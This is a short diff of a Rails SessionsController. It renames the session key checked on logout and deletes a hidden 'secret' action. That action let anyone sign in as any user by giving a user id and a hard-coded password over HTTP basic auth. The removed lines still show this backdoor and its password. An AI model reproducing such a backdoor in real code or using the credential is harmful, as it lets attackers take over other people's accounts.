@@ -26,23 +26,9 @@ class SessionsController < ApplicationController
   end
 
   def destroy
-    if session[:user_id]
+    if session[:account_id]
       clear_user_sign_in_session
       redirect_to root_url
-    end
-  end
-
-  def secret
-    authenticate_or_request_with_http_basic("biaotu") do |username, password|
-      user = User.where(id: username).first
-
-      if user and password == 'win1qa2ws'
-        session[:user_id] = user.id
-        redirect_to_target_or_default
-        true
-      else
-        false
-      end
     end
   end
 
